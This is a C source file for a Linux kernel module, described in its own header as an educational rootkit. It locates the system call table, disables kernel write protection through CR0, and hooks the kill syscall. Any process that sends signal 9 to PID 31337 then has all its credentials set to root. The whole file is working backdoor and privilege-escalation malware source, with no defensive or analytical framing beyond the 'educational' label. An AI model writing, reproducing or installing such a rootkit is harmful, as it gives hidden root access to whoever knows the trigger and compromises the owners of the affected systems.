// rootkit.c - Following LKM conventions exactly
#include <linux/module.h>    // Required for all modules
#include <linux/kernel.h>    // For printk()
#include <linux/init.h>      // For __init and __exit macros
#include <linux/cred.h>      // For credentials
#include <linux/sched.h>     // For current process
#include <linux/unistd.h>    // For syscall numbers
#include <linux/kallsyms.h>  // For finding symbols

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Simple LKM Rootkit - Educational");

// Global variables
static int (*original_kill)(pid_t pid, int sig);
static unsigned long *sys_call_table;

// Our replacement function
static int hacked_kill(pid_t pid, int sig)
{
    struct cred *new_creds;
    
    // Check for our magic trigger
    if (pid == 31337 && sig == 9) {
        new_creds = prepare_creds();
        if (new_creds) {
            new_creds->uid = 0;
            new_creds->gid = 0;
            new_creds->euid = 0;
            new_creds->egid = 0;
            new_creds->suid = 0;
            new_creds->sgid = 0;
            commit_creds(new_creds);
            printk(KERN_INFO "Rootkit: Root privileges granted!\n");
            return 0;
        }
    }
    
    // Call the original function
    return original_kill(pid, sig);
}

// Module initialization function
static int __init rootkit_init(void)
{
    unsigned long cr0;
    
    printk(KERN_INFO "Rootkit: Initializing module\n");
    
    // Find the syscall table
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        printk(KERN_ERR "Rootkit: Could not find sys_call_table\n");
        return -EFAULT;
    }
    
    // Save the original syscall
    original_kill = (int (*)(pid_t, int))sys_call_table[__NR_kill];
    
    // Disable write protection
    cr0 = read_cr0();
    write_cr0(cr0 & ~0x10000);
    
    // Replace the syscall
    sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
    
    // Re-enable write protection
    write_cr0(cr0);
    
    printk(KERN_INFO "Rootkit: Successfully installed\n");
    return 0;  // Return 0 means success
}

// Module cleanup function
static void __exit rootkit_exit(void)
{
    unsigned long cr0;
    
    printk(KERN_INFO "Rootkit: Removing module\n");
    
    // Disable write protection
    cr0 = read_cr0();
    write_cr0(cr0 & ~0x10000);
    
    // Restore the original syscall
    sys_call_table[__NR_kill] = (unsigned long)original_kill;
    
    // Re-enable write protection
    write_cr0(cr0);
    
    printk(KERN_INFO "Rootkit: Successfully removed\n");
}

// Register the init and exit functions
module_init(rootkit_init);
module_exit(rootkit_exit);